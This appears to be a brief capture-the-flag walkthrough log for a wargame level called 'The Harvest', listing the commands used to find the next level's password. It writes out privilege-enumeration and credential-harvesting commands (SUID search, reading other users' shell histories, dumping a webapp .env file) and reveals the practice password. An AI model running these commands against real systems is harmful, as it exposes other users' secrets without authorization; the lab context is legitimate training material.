 [ Phantom · Level 10 ]  The Harvest
 Full brief:  cat ~/BRIEFING

goal: find password for phantom11

cat ~/BRIEFING: Told us to harvest credentials: history, configs, env vars, SSH keys, process memory
id && whoami: We're phantom10, not root as briefing implied
sudo -l; find / -perm -4000 -type f 2>/dev/null: Found leaky-vessels SUID but only executable by group phantom22 — we're excluded
find / -name ".*history" -readable 2>/dev/null: Found history of another user visiting .aws/ and running cat /opt/webapp/.env — pointed us to the target
cat /opt/webapp/.env: DB_PASS=bl_phtm10_ea452c951c2048b2